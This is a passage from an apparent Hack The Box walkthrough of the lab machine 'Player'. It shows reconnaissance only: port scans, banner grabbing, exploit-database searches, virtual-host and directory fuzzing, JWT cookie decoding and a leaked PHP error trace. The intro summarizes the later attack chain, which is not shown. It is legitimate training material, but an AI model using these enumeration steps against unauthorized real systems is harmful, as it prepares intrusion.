@@ -1,0 +1,1091 @@
+<article class="post h-entry" itemscope="" itemtype="http://schema.org/BlogPosting">
+<header class="post-header">
+<h1 class="post-title p-name" itemprop="name headline">HTB: Player</h1>
+<p class="post-meta">
+<span class="tag-list"><a class="post-tag" href="/tags#hackthebox">hackthebox</a> <a class="post-tag" href="/tags#ctf">ctf</a> <a class="post-tag" href="/tags#htb-player">htb-player</a> <a class="post-tag" href="/tags#nmap">nmap</a> <a class="post-tag" href="/tags#vhosts">vhosts</a> <a class="post-tag" href="/tags#ssh">ssh</a> <a class="post-tag" href="/tags#searchsploit">searchsploit</a> <a class="post-tag" href="/tags#wfuzz">wfuzz</a> <a class="post-tag" href="/tags#burp">burp</a> <a class="post-tag" href="/tags#jwt">jwt</a> <a class="post-tag" href="/tags#codiad">codiad</a> <a class="post-tag" href="/tags#bfac">bfac</a> <a class="post-tag" href="/tags#ffmpeg">ffmpeg</a> <a class="post-tag" href="/tags#lshell">lshell</a> <a class="post-tag" href="/tags#webshell">webshell</a> <a class="post-tag" href="/tags#deserialization">deserialization</a> <a class="post-tag" href="/tags#php">php</a> <a class="post-tag" href="/tags#lfi">lfi</a> <a class="post-tag" href="/tags#escape">escape</a> </span><br/><br/>
+<time class="dt-published" datetime="2020-01-18T14:45:00+00:00" itemprop="datePublished">Jan 18, 2020
+      </time></p>
+</header>
+<div class="post-content e-content" itemprop="articleBody">
+<div class="row">
+<div class="col-sm-3">
+<div class="sticky-top">
+<p><a href="/2020/01/18/htb-player.html" style="color: #e6e6e6; text-decoration: none;">HTB: Player</a></p>
+<!--https://afeld.github.io/bootstrap-toc/-->
+<nav data-toggle="toc" id="toc"></nav>
+</div>
+</div>
+<div class="col-sm-9" id="postBody">
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/player-cover.webp" type="image/webp"/>
+<img alt="Player" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/player-cover.png" style="float: right;margin-right:50px; margin-left:50px; width:120px; height:120px;">
+</img></picture>
+<p>Player involved a lot of recon, and pulling together pieces to go down multiple different paths to user and root. I’ll start identifying and enumerating four different virtual hosts. Eventually I’ll find a backup file with PHP source on one, and use it to get access to a private area. From there, I can use a flaw in FFMPEG to leak videos that contain the text contents of various files on Player. I can use that information to get credentials where I can SSH, but only with a <em>very</em> limited shell. However, I can use an SSH exploit to get code execution that provides limited and partial file read, which leads to more credentials. Those credentials are good for a Codiad instance running on another of the virtual hosts, which allows me to get a shell as www-data. There’s a PHP script running as a cron as root that I can exploit either by overwriting a file include, or by writing serialized PHP data. In Beyond Root, I’ll look at two more altnerative paths, one jumping right to shell against Codiad, and the other bypassing lshell.</p>
+<h2 id="box-info">Box Info</h2>
+<!-- https://app.hackthebox.com/machines/196 -->
+<table>
+<thead>
+<tr>
+<th>Name</th>
+<th style="text-align: right"><a href="https://hackthebox.com/machines/player" style="font-size: xx-large; text-shadow: 0 0 5px #ffffff, 0 0 7px #ffffff; color: #1756a9" target="_blank">Player</a> <a href="https://hackthebox.com/machines/player" target="_blank"><picture style="float: right; padding-left: 20px;"><source srcset="/icons/box-player.webp" type="image/webp"/> <img alt="Player" class="img-av" src="/icons/box-player.png"/></picture></a><br/><a href="https://hackthebox.com/machines/player" style="font-size: small; color: white;" target="_blank">Play on HackTheBox</a></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Release Date</td>
+<td style="text-align: right"><a href="https://twitter.com/hackthebox_eu/status/1147055350165757952">06 Jul 2019</a></td>
+</tr>
+<tr>
+<td>Retire Date</td>
+<td style="text-align: right">18 Jan 2020</td>
+</tr>
+<tr>
+<td>OS</td>
+<td style="text-align: right">Linux <picture><source srcset="/icons/Linux.webp" type="image/webp"/><img alt="Linux" class="img-os" src="/icons/Linux.png"/></picture></td>
+</tr>
+<tr>
+<td>Base Points</td>
+<td style="text-align: right"><span class="diff-Hard">Hard [40]</span></td>
+</tr>
+<tr>
+<td>Rated Difficulty</td>
+<td style="text-align: right"><picture><source srcset="/img/player-diff.webp" type="image/webp"/><img alt="Rated difficulty for Player" src="/img/player-diff.png" style="display: unset;"/></picture></td>
+</tr>
+<tr>
+<td>Radar Graph</td>
+<td style="text-align: right"><picture><source srcset="/img/player-radar.webp" type="image/webp"/><img alt="Radar chart for Player" src="/img/player-radar.png" style="display: unset;"/></picture></td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-user.webp" type="image/webp"/><img alt="First Blood User" src="/icons/first-blood-user.png" style="display: unset"/></picture></td>
+<td style="text-align: right"><span class="blood-time">04:24:26</span><a href="https://app.hackthebox.com/users/16690" rel="noopener" target="_blank"><img alt="mprox" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/16690" style="display: unset"/><span class="user-text" style="display: none"> mprox</span></a><br/></td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-root.webp" type="image/webp"/><img alt="First Blood Root" src="/icons/first-blood-root.png" style="display: unset"/></picture></td>
+<td style="text-align: right"><span class="blood-time">04:22:13</span><a href="https://app.hackthebox.com/users/77141" rel="noopener" target="_blank"><img alt="jkr" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/77141" style="display: unset"/><span class="user-text" style="display: none"> jkr</span></a><br/></td>
+</tr>
+<tr>
+<td>Creator</td>
+<td style="text-align: right"><a href="https://app.hackthebox.com/users/13531" rel="noopener" target="_blank"><img alt="MrR3boot" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/13531" style="display: unset"/><span class="user-text" style="display: none"> MrR3boot</span></a><br/></td>
+</tr>
+</tbody>
+</table>
+<h2 id="recon">Recon</h2>
+<h3 id="nmap">nmap</h3>
+<p><code class="language-plaintext highlighter-rouge">nmap</code> shows HTTP on 80 and two SSH servers on TCP 22 and TCP 6686:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>nmap <span class="nt">-p-</span> <span class="nt">--min-rate</span> 10000 <span class="nt">-oA</span> scans/nmap-alltcp 10.10.10.145
+<span class="go">Starting Nmap 7.70 ( https://nmap.org ) at 2019-07-08 01:13 EDT
+Nmap scan report for 10.10.10.145
+Host is up (0.036s latency).
+Not shown: 65532 closed ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+6686/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 9.46 seconds
+</span><span class="gp">root@kali# </span>nmap <span class="nt">-p</span> 22,80,6686 <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-oA</span> scans/nmap-scripts 10.10.10.145
+<span class="go">Starting Nmap 7.70 ( https://nmap.org ) at 2019-07-08 01:15 EDT
+Nmap scan report for 10.10.10.145
+Host is up (0.033s latency).
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.11 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   1024 d7:30:db:b9:a0:4c:79:94:78:38:b3:43:a2:50:55:81 (DSA)
+|   2048 37:2b:e4:31:ee:a6:49:0d:9f:e7:e6:01:e6:3e:0a:66 (RSA)
+|   256 0c:6c:05:ed:ad:f1:75:e8:02:e4:d2:27:3e:3a:19:8f (ECDSA)
+|_  256 11:b8:db:f3:cc:29:08:4a:49:ce:bf:91:73:40:a2:80 (ED25519)
+80/tcp   open  http    Apache httpd 2.4.7
+|_http-server-header: Apache/2.4.7 (Ubuntu)
+|_http-title: 403 Forbidden
+6686/tcp open  ssh     OpenSSH 7.2 (protocol 2.0)
+Service Info: Host: player.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 8.69 seconds
+</span></code></pre></div></div>
+<p>The hostname <code class="language-plaintext highlighter-rouge">player.htb</code> is good to know. I’ll add that to my <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10.10.10.145 player.htb
+</code></pre></div></div>
+<h3 id="ssh---tcp-22-and-6686">SSH - TCP 22 and 6686</h3>
+<p>There typically isn’t a ton of enumeration to do on ssh, but because I see two different services running, I’ll take a quick look. I can manually reproduce the version results <code class="language-plaintext highlighter-rouge">nmap</code> returned:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>nc 10.10.10.145 22
+<span class="go">SSH-2.0-OpenSSH_6.6.1p1 Ubuntu-2ubuntu2.11
+^C
+</span><span class="gp">root@kali# </span>nc 10.10.10.145 6686
+<span class="go">SSH-2.0-OpenSSH_7.2
+^C
+</span></code></pre></div></div>
+<p>The <code class="language-plaintext highlighter-rouge">OpenSSH</code> version on port 22 looks like the standard Ubuntu Trusty (14.04) version, which is old. The 6686 version is close to the standard version for Xenial (16.04).</p>
+<p>The <code class="language-plaintext highlighter-rouge">nmap</code> scan didn’t return a fingerprint for port 6686. I can check this manually as well:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>ssh-keyscan 10.10.10.145 | ssh-keygen <span class="nt">-lf</span> - 
+<span class="c"># 10.10.10.145:22 SSH-2.0-OpenSSH_6.6.1p1 Ubuntu-2ubuntu2.11
+# 10.10.10.145:22 SSH-2.0-OpenSSH_6.6.1p1 Ubuntu-2ubuntu2.11
+# 10.10.10.145:22 SSH-2.0-OpenSSH_6.6.1p1 Ubuntu-2ubuntu2.11
+</span><span class="go">256 SHA256:WSyBHMRO+eahNIIWRpm6TVmnmK9ag3uVAMT1U+Q1zWM 10.10.10.145 (ECDSA)
+2048 SHA256:35fJkzQ4vNSx10WBrjNV+b/N2V0B463/xNWI+HFQ3UM 10.10.10.145 (RSA)
+256 SHA256:8rmrsyqW6LHgmTrVtFYDb+HfglaTm6iWUYZCxFUGg8E 10.10.10.145 (ED25519)
+</span><span class="gp">root@kali# </span>ssh-keyscan <span class="nt">-p</span> 6686 10.10.10.145 | ssh-keygen <span class="nt">-lf</span> - 
+<span class="go">write (10.10.10.145): Connection reset by peer
+write (10.10.10.145): Connection reset by peer
+</span><span class="c"># 10.10.10.145:6686 SSH-2.0-OpenSSH_7.2
+</span><span class="go">2048 SHA256:x40/OBSv8gLgigbiVR3Jw+Tz4vWKxERysLbs6uAl/yQ [10.10.10.145]:6686 (RSA)
+</span></code></pre></div></div>
+<p>Something on 6686 doesn’t respond to the ED checks.</p>
+<p>I did a <code class="language-plaintext highlighter-rouge">searchsploit</code> to see if any obvious vulnerabilities existed against the older version, but nothing looks useful to me yet:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>searchsploit OpenSSH 6.
+<span class="go">---------------------------------------------------------------- ----------------------------------------
+ Exploit Title                                                  |  Path
+                                                                | (/usr/share/exploitdb/)
+---------------------------------------------------------------- ----------------------------------------
+Novell Netware 6.5 - OpenSSH Remote Stack Overflow              | exploits/novell/dos/14866.txt
+OpenSSH 6.8 &lt; 6.9 - 'PTY' Local Privilege Escalation            | exploits/linux/local/41173.c
+OpenSSH 7.2p2 - Username Enumeration                            | exploits/linux/remote/40136.py
+OpenSSH &lt; 6.6 SFTP (x64) - Command Execution                    | exploits/linux_x86-64/remote/45000.c
+OpenSSH &lt; 6.6 SFTP - Command Execution                          | exploits/linux/remote/45001.py
+OpenSSH SCP Client - Write Arbitrary Files                      | exploits/multiple/remote/46516.py
+OpenSSH/PAM 3.6.1p1 - 'gossh.sh' Remote Users Ident             | exploits/linux/remote/26.sh
+OpenSSH/PAM 3.6.1p1 - Remote Users Discovery Tool               | exploits/linux/remote/25.c
+Portable OpenSSH 3.6.1p-PAM/4.1-SuSE - Timing Attack            | exploits/multiple/remote/3303.sh
+---------------------------------------------------------------- ----------------------------------------
+Shellcodes: No Result
+</span></code></pre></div></div>
+<p>The newer SSH has user enumeration and authenticated Command Injection:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>searchsploit OpenSSH 7.2
+<span class="go">-------------------------------------------------------------------------------------------- ----------------------------------------
+ Exploit Title                                                                              |  Path
+                                                                                            | (/usr/share/exploitdb/)
+-------------------------------------------------------------------------------------------- ----------------------------------------
+OpenSSH 7.2 - Denial of Service                                                             | exploits/linux/dos/40888.py
+OpenSSH 7.2p1 - (Authenticated) xauth Command Injection                                     | exploits/multiple/remote/39569.py
+OpenSSH 7.2p2 - Username Enumeration                                                        | exploits/linux/remote/40136.py
+OpenSSHd 7.2p2 - Username Enumeration                                                       | exploits/linux/remote/40113.txt
+-------------------------------------------------------------------------------------------- ----------------------------------------
+Shellcodes: No Result
+</span></code></pre></div></div>
+<p>Don’t see anything useful there yet, but I’ll keep them in mind, since something is clearly going on with SSH.</p>
+<h3 id="website---tcp-80">Website - TCP 80</h3>
+<h4 id="site">Site</h4>
+<p>The site returns a 403 forbidden when accessed at <code class="language-plaintext highlighter-rouge">http://10.10.10.145</code> or at <code class="language-plaintext highlighter-rouge">http://player.htb</code>:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/1562585767783.webp" type="image/webp"/>
+<img alt="1562585767783" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/1562585767783.png"/>
+</picture>
+<h4 id="virtual-hosts">Virtual Hosts</h4>
+<p>Given that I know there’s a hostname, I’ll look for subdomains using <code class="language-plaintext highlighter-rouge">wfuzz</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>wfuzz <span class="nt">-c</span> <span class="nt">-u</span> <span class="s1">'http://10.10.10.145'</span> <span class="nt">-H</span> <span class="s1">'Host: FUZZ.player.htb'</span> <span class="nt">-w</span> /usr/share/seclists/Discovery/DNS/subdomains-top1mil-20000.txt <span class="nt">--hc</span> 403
+<span class="go">
+********************************************************
+* Wfuzz 2.3.4 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.10.145/
+Total requests: 19983
+
+==================================================================
+ID   Response   Lines      Word         Chars          Payload
+==================================================================
+
+000019:  C=200     86 L      229 W         5243 Ch        "dev"
+000067:  C=200     63 L      180 W         1470 Ch        "staging"
+000070:  C=200    259 L      714 W         9513 Ch        "chat"
+009543:  C=400     12 L       53 W          422 Ch        "#www"
+010595:  C=400     12 L       53 W          422 Ch        "#mail"
+
+Total time: 71.01510
+Processed Requests: 19983
+Filtered Requests: 19978
+Requests/sec.: 281.3908
+</span></code></pre></div></div>
+<p>I’ll update my <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file again:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10.10.10.145 player.htb dev.player.htb staging.player.htb chat.player.htb
+</code></pre></div></div>
+<h3 id="chatplayerhtb">chat.player.htb</h3>
+<p>This site has a chat conversation about security vulnerabilities in the site:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/1562586419648.webp" type="image/webp"/>
+<img alt="1562586419648" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/1562586419648.png"/>
+</picture>
+<p>Of note, there are sensitive files on staging, and source code exposed on the main domain.</p>
+<h3 id="playerhtb">player.htb</h3>
+<h4 id="gobuster">gobuster</h4>
+<p>Given the chat about the source code being exposed on the main domain, I’ll give <code class="language-plaintext highlighter-rouge">gobuster</code> a run (it returns the same with the ip or <code class="language-plaintext highlighter-rouge">player.htb</code>):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://player.htb <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt <span class="nt">-o</span> scans/gobuster-player-root <span class="nt">-t</span> 50                                           
+<span class="go">===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://player.htb
+[+] Threads:        50
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2019/07/08 07:43:23 Starting gobuster
+===============================================================
+/launcher (Status: 301)
+===============================================================
+2019/07/08 07:44:36 Finished
+===============================================================
+</span></code></pre></div></div>
+<h4 id="launcher">/launcher</h4>
+<p>This page has a count-down until the product launches:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/1562586567220.webp" type="image/webp"/>
+<img alt="1562586567220" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/1562586567220.png"/>
+</picture>
+<p>If I look at the source and get the url for that image of code (<code class="language-plaintext highlighter-rouge">http://player.htb/launcher/images/img_bg_1_gradient.jpg</code>) with the source code, I can view it completely:</p>
+<p><img alt="Img Bg 1 Gradient image" src="https://0xdfimages.gitlab.io/img/img_bg_1_gradient.jpg.png"/></p>
+<p>This might be the source code leak, but I think there must be more. The page is making a call every second to <code class="language-plaintext highlighter-rouge">/launcher/dee8dc8a47256c64630d803a4c40786e.php</code>. The reply is always:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
+<span class="na">Date</span><span class="p">:</span> <span class="s">Fri, 17 Jan 2020 01:58:55 GMT</span>
+<span class="na">Server</span><span class="p">:</span> <span class="s">Apache/2.4.7 (Ubuntu)</span>
+<span class="na">X-Powered-By</span><span class="p">:</span> <span class="s">PHP/5.5.9-1ubuntu4.26</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">16</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html</span>
+
+Not released yet
+</code></pre></div></div>
+<p>There’s also a form to submit an email address. I’ll enter a dummy email address, 0xdf@10.10.11, using my IP as the domain to see if it tries to contact me. I don’t see anything on <code class="language-plaintext highlighter-rouge">nc -lnvp 25</code>, but I see in Burp that the page I submit to, <code class="language-plaintext highlighter-rouge">/launcher/dee8dc8a47256c64630d803a4c40786c.php</code>, does set a cookie:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">302</span> <span class="ne">Found</span>
+<span class="na">Date</span><span class="p">:</span> <span class="s">Fri, 17 Jan 2020 01:58:57 GMT</span>
+<span class="na">Server</span><span class="p">:</span> <span class="s">Apache/2.4.7 (Ubuntu)</span>
+<span class="na">X-Powered-By</span><span class="p">:</span> <span class="s">PHP/5.5.9-1ubuntu4.26</span>
+<span class="na">Set-Cookie</span><span class="p">:</span> <span class="s">access=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwcm9qZWN0IjoiUGxheUJ1ZmYiLCJhY2Nlc3NfY29kZSI6IkMwQjEzN0ZFMkQ3OTI0NTlGMjZGRjc2M0NDRTQ0NTc0QTVCNUFCMDMifQ.cjGwng6JiMiOWZGz7saOdOuhyr1vad5hAxOJCiM3uzU; expires=Sun, 16-Feb-2020 01:58:57 GMT; Max-Age=2592000; path=/</span>
+<span class="na">Location</span><span class="p">:</span> <span class="s">index.html</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">0</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html</span>
+</code></pre></div></div>
+<p>That’s a JWT, and if I put it into <a href="https://jwt.io/">jwt.io</a>, it decodes to:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/1562601583329.webp" type="image/webp"/>
+<img alt="1562601583329" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/1562601583329.png"/>
+</picture>
+<p>Without the secret, there’s not much I can do to change this cookie, nor would I know what to change it to. I will note that that <code class="language-plaintext highlighter-rouge">access_code</code> is the sha1sum of “welcome”:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span><span class="nb">echo</span> <span class="nt">-n</span> welcome | <span class="nb">sha1sum</span> 
+<span class="go">c0b137fe2d792459f26ff763cce44574a5b5ab03  -
+</span></code></pre></div></div>
+<p>I could try to crack the secret in <code class="language-plaintext highlighter-rouge">john</code> or <code class="language-plaintext highlighter-rouge">hashcat</code>, but given the number of hints from <code class="language-plaintext highlighter-rouge">chat</code>, I’ll save that for now.</p>
+<h3 id="devplayerhtb">dev.player.htb</h3>
+<p>The page presents a black login page:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/1562587289044.webp" type="image/webp"/>
+<img alt="1562587289044" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/1562587289044.png"/>
+</picture>
+<p>It’s not clear what this is, but the more button gives some additional options:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/1562587312922.webp" type="image/webp"/>
+<img alt="1562587312922" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/1562587312922.png"/>
+</picture>
+<p>In the page source, there’s a script at the bottom, <code class="language-plaintext highlighter-rouge">components/user/init.js</code>. Checking that out, I’ll see the Copyright message at the top:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/*
+ *  Copyright (c) Codiad &amp; Kent Safranski (codiad.com), distributed
+ *  as-is and without warranty under the MIT License. See
+ *  [root]/license.txt for more. This information must remain intact.
+ */</span>
+</code></pre></div></div>
+<p><a href="http://codiad.com/">codiad.com</a> has a link to “Try a Live Demo”. Clicking shows me a page with username and password, and a button to access demo. When I click access, I get the same login page:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/1562587490843.webp" type="image/webp"/>
+<img alt="1562587490843" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/1562587490843.png"/>
+</picture>
+<p>I’ll definitely want to check this out if I find creds.</p>
+<h3 id="stagingplayerhtb">staging.player.htb</h3>
+<p>The site looks like it’s down at the moment:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/1562595621520.webp" type="image/webp"/>
+<img alt="1562595621520" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/1562595621520.png"/>
+</picture>
+<p>The “Product Updates” and “About PlayBuff” tabs both give this static page that refreshes every few seconds:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/1562595663852.webp" type="image/webp"/>
+<img alt="1562595663852" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/1562595663852.png"/>
+</picture>
+<p>The “Contact Core Team” link goes to a form:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/1562595690033.webp" type="image/webp"/>
+<img alt="1562595690033" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/1562595690033.png"/>
+</picture>
+<p>On submitting, it drops some php in a redirect to a crash page:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/1562595729559.webp" type="image/webp"/>
+<img alt="1562595729559" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/1562595729559.png"/>
+</picture>
+<p>In Burp, I can grab the php array:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">array</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
+  <span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=&gt;</span>
+  <span class="k">array</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span> <span class="p">{</span>
+    <span class="p">[</span><span class="s2">"file"</span><span class="p">]</span><span class="o">=&gt;</span>
+    <span class="nf">string</span><span class="p">(</span><span class="mi">28</span><span class="p">)</span> <span class="s2">"/var/www/staging/contact.php"</span>
+    <span class="p">[</span><span class="s2">"line"</span><span class="p">]</span><span class="o">=&gt;</span>
+    <span class="nf">int</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>
+    <span class="p">[</span><span class="s2">"function"</span><span class="p">]</span><span class="o">=&gt;</span>
+    <span class="nf">string</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="s2">"c"</span>
+    <span class="p">[</span><span class="s2">"args"</span><span class="p">]</span><span class="o">=&gt;</span>
+    <span class="k">array</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+      <span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=&gt;</span>
+      <span class="o">&amp;</span><span class="nf">string</span><span class="p">(</span><span class="mi">9</span><span class="p">)</span> <span class="s2">"Cleveland"</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+  <span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">=&gt;</span>
+  <span class="k">array</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span> <span class="p">{</span>
+    <span class="p">[</span><span class="s2">"file"</span><span class="p">]</span><span class="o">=&gt;</span>
+    <span class="nf">string</span><span class="p">(</span><span class="mi">28</span><span class="p">)</span> <span class="s2">"/var/www/staging/contact.php"</span>
+    <span class="p">[</span><span class="s2">"line"</span><span class="p">]</span><span class="o">=&gt;</span>
+    <span class="nf">int</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+    <span class="p">[</span><span class="s2">"function"</span><span class="p">]</span><span class="o">=&gt;</span>
+    <span class="nf">string</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="s2">"b"</span>
+    <span class="p">[</span><span class="s2">"args"</span><span class="p">]</span><span class="o">=&gt;</span>
+    <span class="k">array</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+      <span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=&gt;</span>
+      <span class="o">&amp;</span><span class="nf">string</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span> <span class="s2">"Glenn"</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+  <span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">=&gt;</span>
+  <span class="k">array</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span> <span class="p">{</span>
+    <span class="p">[</span><span class="s2">"file"</span><span class="p">]</span><span class="o">=&gt;</span>
+    <span class="nf">string</span><span class="p">(</span><span class="mi">28</span><span class="p">)</span> <span class="s2">"/var/www/staging/contact.php"</span>
+    <span class="p">[</span><span class="s2">"line"</span><span class="p">]</span><span class="o">=&gt;</span>
+    <span class="nf">int</span><span class="p">(</span><span class="mi">11</span><span class="p">)</span>
+    <span class="p">[</span><span class="s2">"function"</span><span class="p">]</span><span class="o">=&gt;</span>
+    <span class="nf">string</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="s2">"a"</span>
+    <span class="p">[</span><span class="s2">"args"</span><span class="p">]</span><span class="o">=&gt;</span>
+    <span class="k">array</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+      <span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=&gt;</span>
+      <span class="o">&amp;</span><span class="nf">string</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span> <span class="s2">"Peter"</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+<span class="nc">Database</span> <span class="n">connection</span> <span class="n">failed</span><span class="mf">.</span><span class="o">&lt;</span><span class="n">html</span><span class="o">&gt;&lt;</span><span class="n">br</span> <span class="o">/&gt;</span><span class="nc">Unknown</span> <span class="n">variable</span> <span class="n">user</span> <span class="n">in</span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">backup</span><span class="o">/</span><span class="n">service_config</span> <span class="n">fatal</span> <span class="n">error</span> <span class="n">in</span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">staging</span><span class="o">/</span><span class="n">fix</span><span class="mf">.</span><span class="n">php</span>
+</code></pre></div></div>
+<p>I’ve got some paths to where some files are on the file system. I can guess at this point that the structure looks something like this, with the three leaked file names:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/var
+  /www
+    /html
+    /staging
+      /contact.php
+      /fix.php
+    /dev
+    /chat
+    /backup
+      /service_config
+</code></pre></div></div>
+<p>When I allow the redirect, I get an error page:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/1562595748807.webp" type="image/webp"/>
+<img alt="1562595748807" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/1562595748807.png"/>
+</picture>
+<p>Interestingly, that’s actually a 200 response code from <code class="language-plaintext highlighter-rouge">501.php</code>.</p>
+<h2 id="access-to-playbuff-cloud">Access to PlayBuff Cloud</h2>
+<h3 id="find-source">Find Source</h3>
+<p>The chat mentioned source being available on the main site. <a href="https://github.com/mazen160/bfac">Backup File Artifact Checker</a>, or <code class="language-plaintext highlighter-rouge">bfac</code> is a good tool to check for artifacts or various tools that create temporary files. For example, on <code class="language-plaintext highlighter-rouge">dev</code>, it finds a <code class="language-plaintext highlighter-rouge">.gitignore</code> file:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>bfac <span class="nt">--url</span> http://dev.player.htb
+<span class="go">----------------------------------------------------------------------
+                 _____ _____ _____ _____
+                | __  |   __|  _  |     |
+                | __ -|   __|     |   --|
+                |_____|__|  |__|__|_____|
+
+           -:::Backup File Artifacts Checker:::-
+                     Version: 1.4
+  Advanced Backup-File Artifacts Testing for Web-Applications
